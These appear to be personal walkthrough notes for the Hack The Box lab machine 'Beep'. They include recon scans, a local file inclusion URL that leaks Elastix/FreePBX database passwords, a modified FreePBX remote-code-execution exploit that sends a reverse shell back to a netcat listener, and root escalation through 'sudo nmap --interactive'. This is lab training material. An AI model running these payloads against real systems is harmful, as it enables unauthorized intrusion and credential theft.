@@ -1,0 +1,459 @@
+RECON
+root@kali:~/htb/beep# nmap -sC -sV -p- -vv -oA full 10.10.10.7
+PORT      STATE SERVICE    REASON         VERSION
+22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68=
+|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw==
+25/tcp    open  smtp       syn-ack ttl 63 Postfix smtpd
+|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.10.10.7/
+110/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_pop3-capabilities: STLS LOGIN-DELAY(0) UIDL EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) USER APOP TOP RESP-CODES AUTH-RESP-CODE PIPELINING
+111/tcp   open  rpcbind    syn-ack ttl 63 2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            875/udp  status
+|_  100024  1            878/tcp  status
+143/tcp   open  imap       syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_imap-capabilities: ATOMIC LISTEXT QUOTA LITERAL+ IMAP4 X-NETSCAPE IDLE MAILBOX-REFERRALS ANNOTATEMORE STARTTLS UNSELECT CATENATE OK THREAD=REFERENCES SORT=MODSEQ ACL NAMESPACE LIST-SUBSCRIBED NO CHILDREN SORT RENAME IMAP4rev1 CONDSTORE BINARY MULTIAPPEND THREAD=ORDEREDSUBJECT Completed RIGHTS=kxte ID URLAUTHA0001 UIDPLUS
+443/tcp   open  ssl/http   syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS))
+|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Elastix - Login page
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity
+| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2017-04-07T08:22:08
+| Not valid after:  2018-04-07T08:22:08
+| MD5:   621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8
+| SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f
+| -----BEGIN CERTIFICATE-----
+| MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t
+| MRIwEAYDVQQIEwlTb21lU3RhdGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQK
+| ExBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxV
+| bml0MR4wHAYDVQQDExVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B
+| CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE3MDQwNzA4MjIwOFoX
+| DTE4MDQwNzA4MjIwOFowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
+| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
+| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
+| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
+| LmxvY2FsZG9tYWluMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3e4HhLYPN
+| gwJ4eKlW/UpmemPfK/a3mcafSqx/AJP34OC0Twj/cZNaqFPLOWfNjcq4mmiV++9a
+| oJCkj4apDkyICI1emsrPaRdrlA/cCXcn3nupfOgcfpBV4vqNfqorEqpJCO7T4bcp
+| Z6YHuxtRtP7gRJiE1ytAFP2jDvtvMqEWkwIDAQABo4IBHTCCARkwHQYDVR0OBBYE
+| FL/OLJ7hJVedlL5Gk0fYvo6bZkqWMIHpBgNVHSMEgeEwgd6AFL/OLJ7hJVedlL5G
+| k0fYvo6bZkqWoYHBpIG+MIG7MQswCQYDVQQGEwItLTESMBAGA1UECBMJU29tZVN0
+| YXRlMREwDwYDVQQHEwhTb21lQ2l0eTEZMBcGA1UEChMQU29tZU9yZ2FuaXphdGlv
+| bjEfMB0GA1UECxMWU29tZU9yZ2FuaXphdGlvbmFsVW5pdDEeMBwGA1UEAxMVbG9j
+| YWxob3N0LmxvY2FsZG9tYWluMSkwJwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9z
+| dC5sb2NhbGRvbWFpboICfVUwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB
+| gQA+ah2n+bomON94KgibPEVPpmW+8N6Sq3f4qDG54urTnPD39GrYHvMwA3B2ang9
+| l3zta5tXYAVj22kiNM2si4bOMQsa6FZR4AEzWCq9tZS/vTCCRaT79mWj3bUvtDkV
+| 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2020-11-03T19:17:45+00:00; +1h04m48s from scanner time.
+878/tcp   open  status     syn-ack ttl 63 1 (RPC #100024)
+993/tcp   open  ssl/imap   syn-ack ttl 63 Cyrus imapd
+|_imap-capabilities: CAPABILITY
+995/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d
+3306/tcp  open  mysql      syn-ack ttl 63 MySQL (unauthorized)
+4190/tcp  open  sieve      syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
+4445/tcp  open  upnotifyp? syn-ack ttl 63
+4559/tcp  open  hylafax    syn-ack ttl 63 HylaFAX 4.3.10
+5038/tcp  open  asterisk   syn-ack ttl 63 Asterisk Call Manager 1.1
+10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+
+
+https://www.exploit-db.com/exploits/18650
+
+
+WEB ENUM
+
+root@kali:~/htb/beep# nmap -T4 -v --script http-enum 10.10.10.7
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+80/tcp    open  http
+| http-enum: 
+|_  /icons/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+110/tcp   open  pop3
+111/tcp   open  rpcbind
+143/tcp   open  imap
+443/tcp   open  https
+| http-enum: 
+|   /mail/: Mail folder
+|   /robots.txt: Robots file
+|   /configs/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|   /help/: Potentially interesting folder
+|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|   /modules/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|_  /themes/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+993/tcp   open  imaps
+995/tcp   open  pop3s
+3306/tcp  open  mysql
+4445/tcp  open  upnotifyp
+10000/tcp open  snet-sensor-mgmt
+
+SMTP ENUM
+root@kali:~/htb/beep# nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.7
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-03 14:52 EST
+Failed to resolve "–script".
+Failed to resolve "smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764".
+Nmap scan report for 10.10.10.7
+Host is up (0.026s latency).
+
+PORT   STATE SERVICE
+25/tcp open  smtp
+
+root@kali:~/htb/beep# nc 10.10.10.7 25
+220 beep.localdomain ESMTP Postfix
+
+500 5.5.2 Error: bad syntax
+
+root@kali:~/htb/beep# nmap -Pn --script vuln 10.10.10.7
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-03 15:51 EST
+Nmap scan report for 10.10.10.7
+Host is up (0.098s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+| smtp-vuln-cve2010-4344: 
+|_  The SMTP server is not Exim: NOT VULNERABLE
+|_sslv2-drown: 
+80/tcp    open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /icons/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|_http-passwd: ERROR: Script execution failed (use -d to debug)
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-trace: TRACE is enabled
+110/tcp   open  pop3
+|_sslv2-drown: 
+111/tcp   open  rpcbind
+143/tcp   open  imap
+|_sslv2-drown: 
+443/tcp   open  https
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /mail/: Mail folder
+|   /robots.txt: Robots file
+|   /configs/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|   /help/: Potentially interesting folder
+|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|   /modules/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+|_  /themes/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
+| http-fileupload-exploiter: 
+|   
+|_    Couldn't find a file-type field.
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-trace: TRACE is enabled
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+| ssl-ccs-injection: 
+|   VULNERABLE:
+|   SSL/TLS MITM vulnerability (CCS Injection)
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
+|       does not properly restrict processing of ChangeCipherSpec messages,
+|       which allows man-in-the-middle attackers to trigger use of a zero
+|       length master key in certain OpenSSL-to-OpenSSL communications, and
+|       consequently hijack sessions or obtain sensitive information, via
+|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
+|           
+|     References:
+|       http://www.openssl.org/news/secadv_20140605.txt
+|       http://www.cvedetails.com/cve/2014-0224
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus
+|             Modulus Length: 1024
+|             Generator Length: 8
+|             Public Key Length: 1024
+|     References:
+|_      https://weakdh.org
+| ssl-poodle: 
+|   VULNERABLE:
+|   SSL POODLE information leak
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2014-3566  OSVDB:113251
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+|           products, uses nondeterministic CBC padding, which makes it easier
+|           for man-in-the-middle attackers to obtain cleartext data via a
+|           padding-oracle attack, aka the "POODLE" issue.
+|     Disclosure date: 2014-10-14
+|     Check results:
+|       TLS_RSA_WITH_AES_128_CBC_SHA
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+|       https://www.imperialviolet.org/2014/10/14/poodle.html
+|       http://osvdb.org/113251
+|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
+|_sslv2-drown: 
+993/tcp   open  imaps
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+|_sslv2-drown: 
+995/tcp   open  pop3s
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+|_sslv2-drown: 
+3306/tcp  open  mysql
+|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+4445/tcp  open  upnotifyp
+10000/tcp open  snet-sensor-mgmt
+
+
+root@kali:~/htb/beep# nikto -h https://10.10.10.7
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.7
++ Target Hostname:    10.10.10.7
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
+                   Ciphers:  DHE-RSA-AES256-SHA
+                   Issuer:   /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
++ Start Time:         2020-11-03 16:15:04 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.3 (CentOS)
++ Retrieved x-powered-by header: PHP/5.1.6
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie elastixSession created without the secure flag
++ Cookie elastixSession created without the httponly flag
++ Server leaks inodes via ETags, header found with file /robots.txt, inode: 889199, size: 28, mtime: Fri Jan  8 00:43:28 2072
++ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "https://127.0.0.1/images/".
++ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Hostname '10.10.10.7' does not match certificate's names: localhost.localdomain
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ /help/: Help directory should not be accessible
++ Cookie PHPSESSID created without the secure flag
++ Cookie PHPSESSID created without the httponly flag
++ /config.php: PHP Config file may contain database IDs and passwords.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /mail/: This might be interesting...
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
++ OSVDB-3268: /static/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /panel/: Admin login page/section found.
++ 8460 requests: 0 error(s) and 28 item(s) reported on remote host
++ End Time:           2020-11-03 16:36:27 (GMT-5) (1283 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+EXPLOIT
+
+LFI EXPLOIT FOR FREEPBX
+https://www.exploit-db.com/exploits/37637
+
+GET LOGIN CREDENTIALS
+view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+AMPDBHOST=localhost
+AMPDBENGINE=mysql
+# AMPDBNAME=asterisk
+AMPDBUSER=asteriskuser
+# AMPDBPASS=amp109
+AMPDBPASS=jEhdIekWmdjE
+AMPENGINE=asterisk
+AMPMGRUSER=admin
+#AMPMGRPASS=amp111
+AMPMGRPASS=jEhdIekWmdjE
+
+
+ ARI_ADMIN_USERNAME=admin # This is the default admin password to allow an administrator to login to ARI bypassing all security. 
+# Change this to a secure password. ARI_ADMIN_PASSWORD=jEhdIekWmdjE 
+
+LOGIN TO FREEPBX ADMIN PANEL
+https://10.10.10.7/admin/config.php
+
+
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+
+SEARCH FOR EXPLOIT
+root@kali:~/htb/beep# searchsploit elastix
+-------------------------------------------------- ----------------------------------------
+ Exploit Title                                    |  Path
+                                                  | (/usr/share/exploitdb/)
+-------------------------------------------------- ----------------------------------------
+Elastix - 'page' Cross-Site Scripting             | exploits/php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabi | exploits/php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vul | exploits/php/webapps/34942.txt
+Elastix 2.2.0 - 'graph.php' Local File Inclusion  | exploits/php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                 | exploits/php/webapps/36305.txt
+Elastix < 2.5 - PHP Code Injection                | exploits/php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Exec | exploits/php/webapps/18650.py
+
+USE FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Exec 
+https://www.exploit-db.com/exploits/18650
+
+MODIFY EXPLOIT AND ADD SSL BYPASS
+root@kali:~/htb/beep# vim freepbx_2.10.py 
+import ssl
+
+try:
+    _create_unverified_https_context = ssl._create_unverified_context
+except AttributeError:
+    # Legacy Python that doesn't verify HTTPS certificates by default
+    pass
+else:
+    # Handle target environment that doesn't support HTTPS verification
+    ssl._create_default_https_context = _create_unverified_https_context
+
+rhost="10.10.10.7"
+lhost="10.10.14.8"
+lport=443
+extension="1000"
+
+CHANGE EXTENSION AS 1000 FAILS
+root@kali:~/htb/beep# svwar -m INVITE -e100-300 10.10.10.7
+WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+| Extension | Authentication |
+------------------------------
+| 233       | reqauth        |
+
+root@kali:~/htb/beep# vim freepbx_2.10.py 
+rhost="10.10.10.7"
+lhost="10.10.14.8"
+lport=443
+extension="1000"
+
+GET LOW PRIV SHELL
+root@kali:~/htb/beep# nc -lvp 443
+listening on [any] 443 ...
+10.10.10.7: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.7] 58208
+id
+uid=100(asterisk) gid=101(asterisk)
+pwd
+/tmp
+ls -l /home/    
+total 12
+drwxrwxr-x 2 fanis      fanis      4096 Apr  7  2017 fanis
+drwx------ 2 spamfilter spamfilter 4096 Apr  7  2017 spamfilter
+ls -l /home/fanis/
+total 4
+-rw-rw-r-- 1 fanis fanis 33 Apr  7  2017 user.txt
+
+USER FLAG
+cat /home/fanis/user.txt
+##############################
+
+PRIVESC USING INFORMATION IN EXPLOIT DESCRIPTION
+# On Elastix, once we have a shell, we can escalate to root:
+# root@bt:~# nc -lvp 443
+# listening on [any] 443 ...
+# connect to [172.16.254.223] from voip [172.16.254.72] 43415
+# id
+# uid=100(asterisk) gid=101(asterisk)
+# sudo nmap --interactive
+
+# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+# Welcome to Interactive Mode -- press h <enter> for help
+# nmap> !sh
+# id
+# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
+sudo -l
+Matching Defaults entries for asterisk on this host:
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY"
+
+User asterisk may run the following commands on this host:
+    (root) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
+    (root) NOPASSWD: /bin/chmod
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /sbin/service
+    (root) NOPASSWD: /sbin/init
+    (root) NOPASSWD: /usr/sbin/postmap
+    (root) NOPASSWD: /usr/sbin/postfix
+    (root) NOPASSWD: /usr/sbin/saslpasswd2
+    (root) NOPASSWD: /usr/sbin/hardware_detector
+    (root) NOPASSWD: /sbin/chkconfig
+    (root) NOPASSWD: /usr/sbin/elastix-helper
+sudo nmap --interactive    
+
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
+
+ROOT FLAG
+cat /root/root.txt
+#####################################
